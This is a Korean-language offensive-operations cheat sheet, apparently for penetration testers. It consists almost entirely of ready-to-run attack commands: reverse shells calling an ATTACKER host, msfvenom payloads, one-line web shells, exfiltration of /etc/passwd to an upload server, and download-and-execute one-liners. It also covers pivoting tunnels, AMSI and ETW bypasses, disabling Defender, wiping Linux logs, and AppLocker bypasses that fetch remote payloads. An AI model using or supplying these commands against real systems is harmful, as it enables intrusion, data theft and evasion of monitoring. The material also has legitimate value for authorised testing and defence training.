# 오퍼레이션 인프라

---

## 리버스 쉘

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Bash (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
$c=New-Object Net.Sockets.TCPClient("ATTACKER",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII.GetBytes($r)),0,$r.Length)}

# PHP
php -r '$s=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# 리스너
rlwrap nc -lvnp 4444
ncat -lvnp 4444 --ssl          # 암호화
```

### 쉘 업그레이드

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 200
```

### msfvenom 페이로드

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o shell.dll

# Web
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war
```

### 웹쉘

```php
<?php system($_GET['cmd']); ?>
```

```asp
<%eval request("cmd")%>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## 파일 전송

```bash
# 서버
python3 -m http.server 8080

# Linux 다운로드
curl http://ATTACKER/file -o /tmp/file
wget http://ATTACKER/file -O /tmp/file

# Windows 다운로드
certutil -urlcache -split -f http://ATTACKER/file C:\temp\file
iwr http://ATTACKER/file -OutFile C:\temp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\temp\file')

# 메모리 로드 (디스크에 안 남김)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')

# SMB 서버
impacket-smbserver share /path -smb2support
impacket-smbserver share /path -smb2support -username user -password pass
# Windows에서: copy \\ATTACKER\share\file C:\temp\file

# SCP / Netcat
scp file user@TARGET:/tmp/file
nc -lvnp 4444 > received_file                 # 수신
nc TARGET 4444 < file                          # 송신

# Base64 (방화벽 우회)
base64 -w0 file | xclip                       # 인코딩
echo BASE64 | base64 -d > file                # 디코딩
# Windows
[IO.File]::WriteAllBytes("C:\temp\file", [Convert]::FromBase64String("BASE64"))

# 업로드 서버
pip3 install uploadserver && python3 -m uploadserver 8080
curl -F 'file=@/etc/passwd' http://ATTACKER:8080/upload
```

### 전송 방법 선택

| 상황 | 추천 방법 |
|------|----------|
| Linux → Linux | scp, curl/wget |
| Linux → Windows | impacket-smbserver, HTTP |
| Windows → Linux | IWR/certutil + HTTP, SMB |
| 방화벽 제한 (443만) | HTTPS 터널링 |
| 바이너리 전송 불가 | Base64 인코딩 |
| 디스크에 안 남기고 싶을 때 | IEX 메모리 로드 |

---

## 터널링

```bash
# SSH 로컬 포워딩
ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@PIVOT

# SSH 다이나믹 (SOCKS)
ssh -D 1080 user@PIVOT
proxychains nmap -sT TARGET

# SSH 멀티 홉
ssh -J user@PIVOT1,user@PIVOT2 user@INTERNAL

# sshuttle (SSH 기반 VPN)
sshuttle -r user@PIVOT 10.0.0.0/24
```

### Chisel

```bash
# 서버 (공격자)
./chisel server -p 8000 --reverse

# SOCKS 프록시
./chisel client ATTACKER:8000 R:socks

# 포트 포워딩
./chisel client ATTACKER:8000 R:8888:INTERNAL:80
```

### Ligolo-ng

```bash
# 프록시 (공격자)
sudo ip tuntap add user $(whoami) mode tun dev ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 에이전트 (Pivot)
./agent -connect ATTACKER:11601 -ignore-cert

# 프록시에서
session                                        # 세션 선택
sudo ip route add 10.0.0.0/24 dev ligolo       # 내부 대역 라우팅
start                                          # 터널 시작

# 리스너 추가 (Reverse Connection)
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# 내부 호스트 → Pivot:4444 → 공격자:4444
```

### sshuttle

```bash
# SSH 기반 VPN-like 터널
sshuttle -r user@PIVOT 10.0.0.0/24
sshuttle -r user@PIVOT 10.0.0.0/24 --ssh-cmd 'ssh -i id_rsa'
sshuttle --dns -r user@PIVOT 10.0.0.0/24      # DNS 포함
```

### proxychains

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

proxychains nmap -sT -Pn TARGET               # TCP Connect만 가능
proxychains nxc smb TARGET -u USER -p PASS
proxychains evil-winrm -i TARGET -u admin -p PASS
# 주의: proxychains는 TCP만 지원 (ICMP/UDP 불가)
```

### 더블 Pivot

```text
공격자 → PIVOT1 (DMZ) → PIVOT2 (내부) → TARGET
```

```bash
# 1단계: 공격자 → PIVOT1
chisel server -p 8080 --reverse                # 공격자
chisel client ATTACKER:8080 R:socks            # PIVOT1

# 2단계: PIVOT1 → PIVOT2
chisel server -p 9090 --reverse                # PIVOT1
chisel client PIVOT1:9090 R:1081:socks         # PIVOT2

# proxychains 체인
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

### Metasploit

```bash
meterpreter> run autoroute -s 10.0.0.0/24
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080 && run -j
meterpreter> portfwd add -l 8080 -p 80 -r INTERNAL_TARGET
```

### C2 통신 채널

| 채널 | 장점 | 단점 |
|------|------|------|
| HTTP/HTTPS | 방화벽 통과 용이 | 프록시/DPI 탐지 가능 |
| DNS | 매우 은밀 | 느림 |
| SMB (Named Pipe) | 내부 Pivot | 외부 통신 불가 |
| mTLS | 암호화, 빠름 | 비표준 포트 사용 |
| DoH | DPI 우회 | 지원 도구 제한적 |

---

## 방어 우회

### AV/EDR 확인

| 프로세스 | 제품 |
|---------|------|
| MsMpEng.exe | Windows Defender |
| CSFalconService.exe | CrowdStrike |
| cb.exe | Carbon Black |
| SentinelAgent.exe | SentinelOne |
| bdagent.exe | Bitdefender |

```powershell
Get-Process | Select ProcessName
tasklist /svc
```

### 우회

```powershell
# AMSI (난독화 필수)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW 비활성화 (이벤트 로깅 차단)
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

# Defender 비활성화
Set-MpPreference -DisableRealtimeMonitoring $true
# 제외 경로 추가
Set-MpPreference -ExclusionPath "C:\temp"

# CLM 확인
$ExecutionContext.SessionState.LanguageMode

# AppLocker 우회 경로
C:\Windows\Tasks\
C:\Windows\Temp\
MSBuild.exe payload.csproj
```

### Linux 우회

```bash
# 히스토리 비활성화
unset HISTFILE
export HISTSIZE=0
set +o history

# 로그 정리
echo > /var/log/auth.log
echo > /var/log/syslog
echo > ~/.bash_history
history -c

# Timestomping
touch -r /etc/passwd /tmp/implant              # 다른 파일의 시간 복사

# auditd 상태 확인
systemctl status auditd
auditctl -l                                    # 룰 확인
```

### AppLocker 우회 방법

```powershell
# 허용된 경로 확인
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# Regsvr32 (원격 SCT 실행)
regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll

# MSHTA
mshta http://ATTACKER/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"":close")

# WMIC
wmic process call create "cmd.exe /c whoami"
wmic os get /format:"http://ATTACKER/payload.xsl"

# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami")
```

### Process Injection 개요

```text
기법                    | 탐지 난이도 | 설명
-----------------------|-----------|----
Classic DLL Injection  | 쉬움      | OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
Reflective DLL         | 중간      | 디스크에 DLL 안 남김
Process Hollowing      | 중간      | 합법 프로세스 생성 (suspended) → 코드 교체
APC Injection          | 어려움    | QueueUserAPC로 대기 스레드에 주입
Syscall (Direct/Indirect)| 어려움  | ntdll 직접 호출 → EDR 후킹 우회
```

### Windows Credential Guard 우회

```powershell
# Credential Guard 상태 확인
Get-ComputerInfo | Select DeviceGuardSecurityServicesRunning

# 활성화 시 LSASS 메모리 덤프 불가
# 대안: DPAPI, Kerberos 티켓, SAM 덤프, DCSync
```
